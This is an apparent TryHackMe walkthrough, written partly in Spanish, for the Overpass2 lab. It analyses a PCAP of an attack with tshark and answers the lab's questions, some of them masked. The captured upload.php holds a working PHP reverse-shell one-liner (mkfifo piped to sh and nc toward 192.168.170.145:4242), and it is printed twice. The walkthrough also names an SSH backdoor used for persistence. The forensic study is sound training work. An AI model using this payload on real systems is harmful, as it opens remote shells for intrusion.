# Overpass2 TryHackme Walkthrough

<p align="center">
  <img width="400" height="400" src="https://github.com/ceortiz33/tryhackme/blob/main/OverPass2/images/overpass2.png">
</p>


## Forensics - Analyze the PCAP
Para esta seccion se utiliza un archivo PCAP que nos entregan como evidencia de un ataque.

```
tshark -r overpass2.pcapng -T fields -e ip.dst | sort | uniq -c
```

```
   1463 140.82.118.4
      2 192.168.170.138
    262 192.168.170.145
   2113 192.168.170.159
      2 192.168.170.2
      1 192.168.170.254
      3 224.0.0.22
      4 224.0.0.251
     14 239.255.255.250
      1 91.189.91.157
```

```
# tshark -r overpass2.pcapng -Y "http"

4 0.000326676 192.168.170.145 → 192.168.170.159 HTTP 484 GET /development/ HTTP/1.1 
    6 0.000860947 192.168.170.159 → 192.168.170.145 HTTP 1078 HTTP/1.1 200 OK  (text/html)
   14 7.915992166 192.168.170.145 → 192.168.170.159 HTTP 1026 POST /development/upload.php HTTP/1.1  (application/x-php)
   16 7.916964256 192.168.170.159 → 192.168.170.145 HTTP 309 HTTP/1.1 200 OK  (text/html)
   18 11.984825193 192.168.170.145 → 192.168.170.159 HTTP 401 GET /development/uploads/ HTTP/1.1 
   19 11.985407246 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
   27 28.574178738 192.168.170.145 → 192.168.170.159 HTTP 466 GET /development/uploads/payload.php HTTP/1.1 
 3562 229.072082387 192.168.170.159 → 192.168.170.145 HTTP 224 GET /cooctus.png HTTP/1.1 
 3585 229.073323788 192.168.170.145 → 192.168.170.159 HTTP 15280 [TCP Spurious Retransmission] HTTP/1.0 200 OK  (PNG)
 3611 235.053124579 192.168.170.159 → 192.168.170.145 HTTP 223 GET /index.html HTTP/1.1 
 3619 235.053836457 192.168.170.145 → 192.168.170.159 HTTP 881 HTTP/1.0 200 OK  (text/html)
 3876 284.434399160 192.168.170.145 → 192.168.170.159 HTTP 472 GET / HTTP/1.1 
 3878 284.434823231 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
 3880 284.443819303 192.168.170.145 → 192.168.170.159 HTTP 347 GET /cooctus.png HTTP/1.1 
 3890 284.444614924 192.168.170.159 → 192.168.170.145 HTTP 14119 HTTP/1.1 200 OK  (PNG)
```

```
# tshark -r overpass2.pcapng --export-object http,/home/kali/Documents/tryhackme/overpass2/exported/
# cd exported
# ls

 %2f  'cooctus(1).png'   cooctus.png   development   index.html  'upload(1).php'   upload.php   uploads
```

```
# nano upload.php

----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--

```

```
for stream in `tshark -r overpass2.pcapng -Y "ip.addr eq 192.168.170.145 and tcp.port eq 4242" -T fields -e tcp.stream | sort -n -u`; do echo Stream: $stream; tshark -r overpass2.pcapng -q -z follow,tcp,ascii,$stream; done
```

### What was the URL of the page they used to upload a reverse shell?

```
/dev********/
```

### What payload did the attacker use to gain access?

```
&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

### What password did the attacker used to get access?

```
when******************
```

### How did the attacker establish persistence?

```
https://github.com/*********/ssh-backdoor
```

Using the fasttrack wordlist, how many of the system passwords were crackable?

```
*    A value between 2 and 5
```




